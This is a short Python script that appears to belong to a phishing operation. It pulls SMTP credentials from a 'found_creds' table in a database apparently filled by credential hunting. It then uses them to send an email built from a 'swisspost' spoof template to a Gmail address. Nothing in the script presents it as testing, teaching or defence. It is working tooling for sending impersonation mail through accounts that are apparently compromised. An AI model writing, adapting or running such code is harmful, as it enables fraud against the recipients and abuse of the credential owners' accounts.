import sys
sys.path.insert(0, '/opt/darkvasend')
for m in list(sys.modules):
    if 'auditguard' in m: del sys.modules[m]
from auditguard.campaign_sender import send_clean
from auditguard.spoof_templates import get_template
import sqlite3
db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row
smtp = db.execute('SELECT * FROM found_creds WHERE id=5').fetchone()
db.close()
smtp_config = {
    'host': smtp['smtp_host'], 'port': smtp['smtp_port'],
    'username': smtp['smtp_user'], 'password': smtp['smtp_password'],
    'from_email': smtp['smtp_user'],
}
tpl = get_template('swisspost')
result = send_clean(
    smtp_config, tpl['from_name'], tpl['from_email'],
    'hahajemrnfxjxj@gmail.com', tpl['subject'], tpl['html'],
    tpl.get('reply_to', ''), None,
)
print('Result:', result, flush=True)
